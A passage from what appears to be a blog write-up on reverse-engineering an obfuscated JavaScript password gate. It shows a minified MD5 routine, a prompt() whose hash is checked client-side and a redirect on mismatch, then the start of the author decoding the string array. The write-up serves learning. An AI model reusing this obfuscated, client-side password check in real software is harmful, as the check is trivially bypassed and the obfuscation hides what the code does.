class="mi">6</span><span class="p">,</span><span class="o">-</span><span class="mi">198630844</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="mi">10</span><span class="p">,</span><span class="mi">1126891415</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span><span class="mi">15</span><span class="p">,</span><span class="o">-</span><span class="mi">1416354905</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="mi">21</span><span class="p">,</span><span class="o">-</span><span class="mi">57434055</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span><span class="mi">6</span><span class="p">,</span><span class="mi">1700485571</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">10</span><span class="p">,</span><span class="o">-</span><span class="mi">1894986606</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="mi">15</span><span class="p">,</span><span class="o">-</span><span class="mi">1051523</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">21</span><span class="p">,</span><span class="o">-</span><span class="mi">2054922799</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="mi">6</span><span class="p">,</span><span class="mi">1873313359</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="mi">10</span><span class="p">,</span><span class="o">-</span><span class="mi">30611744</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="mi">15</span><span class="p">,</span><span class="o">-</span><span class="mi">1560198380</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span><span class="mi">21</span><span class="p">,</span><span class="mi">1309151649</span><span class="p">);</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mi">6</span><span class="p">,</span><span class="o">-</span><span class="mi">145523070</span><span class="p">);</span><span class="nx">_0xf6a0x7</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span><span class="mi">10</span><span class="p">,</span><span class="o">-</span><span class="mi">1120210379</span><span class="p">);</span><span class="nx">_0xf6a0x6</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">15</span><span class="p">,</span><span class="mi">718787259</span><span class="p">);</span><span class="nx">_0xf6a0x5</span><span class="o">=</span><span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x3</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="mi">21</span><span class="p">,</span><span class="o">-</span><span class="mi">343485551</span><span class="p">);</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=</span><span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="mi">3</span><span class="p">]);}</span><span class="kd">function</span> <span class="nx">cmn</span><span class="p">(</span><span class="nx">_0xf6a0x9</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">){</span><span class="nx">_0xf6a0x4</span><span class="o">=</span><span class="nx">add32</span><span class="p">(</span><span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x9</span><span class="p">),</span><span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">));</span><span class="k">return</span> <span class="nx">add32</span><span class="p">((</span><span class="nx">_0xf6a0x4</span><span class="o">&lt;&lt;</span><span class="nx">_0xf6a0xa</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="o">&gt;&gt;&gt;</span><span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="nx">_0xf6a0xa</span><span class="p">)),</span><span class="nx">_0xf6a0x5</span><span class="p">);}</span><span class="kd">function</span> <span class="nx">ff</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">){</span><span class="k">return</span> <span class="nx">cmn</span><span class="p">((</span><span class="nx">_0xf6a0x5</span><span class="o">&amp;</span><span class="nx">_0xf6a0x6</span><span class="p">)</span><span class="o">|</span><span class="p">((</span><span class="o">~</span><span class="nx">_0xf6a0x5</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">_0xf6a0x7</span><span class="p">),</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">)}</span><span class="kd">function</span> <span class="nx">gg</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">){</span><span class="k">return</span> <span class="nx">cmn</span><span class="p">((</span><span class="nx">_0xf6a0x5</span><span class="o">&amp;</span><span class="nx">_0xf6a0x7</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="o">&amp;</span><span class="p">(</span><span class="o">~</span><span class="nx">_0xf6a0x7</span><span class="p">)),</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">)}</span><span class="kd">function</span> <span class="nx">hh</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">){</span><span class="k">return</span> <span class="nx">cmn</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="o">^</span><span class="nx">_0xf6a0x6</span><span class="o">^</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">)}</span><span class="kd">function</span> <span class="nx">ii</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x6</span><span class="p">,</span><span class="nx">_0xf6a0x7</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">){</span><span class="k">return</span> <span class="nx">cmn</span><span class="p">(</span><span class="nx">_0xf6a0x6</span><span class="o">^</span><span class="p">(</span><span class="nx">_0xf6a0x5</span><span class="o">|</span><span class="p">(</span><span class="o">~</span><span class="nx">_0xf6a0x7</span><span class="p">)),</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">,</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0xa</span><span class="p">,</span><span class="nx">_0xf6a0xb</span><span class="p">)}</span><span class="kd">function</span> <span class="nx">md51</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">){</span><span class="nx">txt</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="kd">var</span> <span class="nx">_0xf6a0x11</span><span class="o">=</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">1</span><span class="p">]],</span><span class="nx">_0xf6a0x12</span><span class="o">=</span><span class="p">[</span><span class="mi">1732584193</span><span class="p">,</span><span class="o">-</span><span class="mi">271733879</span><span class="p">,</span><span class="o">-</span><span class="mi">1732584194</span><span class="p">,</span><span class="mi">271733878</span><span class="p">],</span><span class="nx">_0xf6a0x13</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">_0xf6a0x13</span><span class="o">=</span><span class="mi">64</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">&lt;=</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span><span class="nx">_0xf6a0x13</span><span class="o">+=</span><span class="mi">64</span><span class="p">){</span><span class="nx">md5cycle</span><span class="p">(</span><span class="nx">_0xf6a0x12</span><span class="p">,</span><span class="nx">md5blk</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span><span class="nx">_0xf6a0x13</span><span class="p">)))};</span><span class="nx">_0xf6a0xa</span><span class="o">=</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="o">-</span><span class="mi">64</span><span class="p">);</span><span class="kd">var</span> <span class="nx">_0xf6a0x14</span><span class="o">=</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">];</span><span class="k">for</span><span class="p">(</span><span class="nx">_0xf6a0x13</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">&lt;</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span><span class="nx">_0xf6a0x13</span><span class="o">++</span><span class="p">){</span><span class="nx">_0xf6a0x14</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">]</span><span class="o">|=</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="p">((</span><span class="nx">_0xf6a0x13</span><span class="o">%</span><span class="mi">4</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">3</span><span class="p">)};</span><span class="nx">_0xf6a0x14</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">]</span><span class="o">|=</span><span class="mh">0x80</span><span class="o">&lt;&lt;</span><span class="p">((</span><span class="nx">_0xf6a0x13</span><span class="o">%</span><span class="mi">4</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">3</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">_0xf6a0x13</span><span class="o">&gt;</span><span class="mi">55</span><span class="p">){</span><span class="nx">md5cycle</span><span class="p">(</span><span class="nx">_0xf6a0x12</span><span class="p">,</span><span class="nx">_0xf6a0x14</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="nx">_0xf6a0x13</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">++</span><span class="p">){</span><span class="nx">_0xf6a0x14</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span><span class="p">};};</span><span class="nx">_0xf6a0x14</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="o">=</span><span class="nx">_0xf6a0x11</span><span class="o">*</span><span class="mi">8</span><span class="p">;</span><span class="nx">md5cycle</span><span class="p">(</span><span class="nx">_0xf6a0x12</span><span class="p">,</span><span class="nx">_0xf6a0x14</span><span class="p">);</span><span class="k">return</span> <span class="nx">_0xf6a0x12</span><span class="p">;}</span><span class="kd">function</span> <span class="nx">md5blk</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0xf6a0x16</span><span class="o">=</span><span class="p">[],</span><span class="nx">_0xf6a0x13</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">_0xf6a0x13</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">&lt;</span><span class="mi">64</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span><span class="nx">_0xf6a0x16</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">_0xf6a0x13</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">24</span><span class="p">)};</span><span class="k">return</span> <span class="nx">_0xf6a0x16</span><span class="p">;}</span><span class="kd">var</span> <span class="nx">hex_chr</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">4</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="kd">function</span> <span class="nx">rhex</span><span class="p">(</span><span class="nx">_0xf6a0x11</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0xf6a0xa</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nx">_0xf6a0x19</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="k">for</span><span class="p">(;</span><span class="nx">_0xf6a0x19</span><span class="o">&lt;</span><span class="mi">4</span><span class="p">;</span><span class="nx">_0xf6a0x19</span><span class="o">++</span><span class="p">){</span><span class="nx">_0xf6a0xa</span><span class="o">+=</span><span class="nx">hex_chr</span><span class="p">[(</span><span class="nx">_0xf6a0x11</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="nx">_0xf6a0x19</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0x0F</span><span class="p">]</span><span class="o">+</span><span class="nx">hex_chr</span><span class="p">[(</span><span class="nx">_0xf6a0x11</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="nx">_0xf6a0x19</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0x0F</span><span class="p">]};</span><span class="k">return</span> <span class="nx">_0xf6a0xa</span><span class="p">;}</span><span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">){</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">_0xf6a0x13</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">&lt;</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span><span class="nx">_0xf6a0x13</span><span class="o">++</span><span class="p">){</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="p">]</span><span class="o">=</span><span class="nx">rhex</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="p">])};</span><span class="k">return</span> <span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">6</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);}</span><span class="kd">function</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">){</span><span class="k">return</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">md51</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">))}</span><span class="kd">function</span> <span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">){</span><span class="k">return</span> <span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="o">+</span><span class="nx">_0xf6a0x5</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFFFFFF</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span><span class="o">!=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">8</span><span class="p">]){</span><span class="kd">function</span> <span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0x1d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0xf6a0x1e</span><span class="o">=</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0x1d</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">),</span><span class="nx">_0xf6a0x1f</span><span class="o">=</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0x1d</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0x1e</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">);</span><span class="k">return</span> <span class="p">(</span><span class="nx">_0xf6a0x1f</span><span class="o">&lt;&lt;</span><span class="mi">16</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="nx">_0xf6a0x1e</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">);}};</span><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span><span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="nx">X</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">X</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">===</span><span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">==</span><span class="nx">L</span><span class="p">){}</span><span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span><span class="kd">function</span> <span class="nx">ready</span><span class="p">(</span><span class="nx">_0xf6a0x23</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">13</span><span class="p">]]</span><span class="o">!=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">14</span><span class="p">]){</span><span class="nx">_0xf6a0x23</span><span class="p">()}</span><span class="k">else</span> <span class="p">{</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">16</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="nx">_0xf6a0x23</span><span class="p">)}}</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0xf6a0x24</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">17</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">20</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">19</span><span class="p">])[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">18</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0xf6a0x24</span><span class="p">;});</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now this is exactly the code that any sane person would like to read! Thankfully, you don&rsquo;t need to read it, although the comment sure is interesting! I printed the contents of the <code>_0x5cf4</code> variable and there was a lot to see, but I only show the important part:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[ '',
</span><span class='line'>  'length',
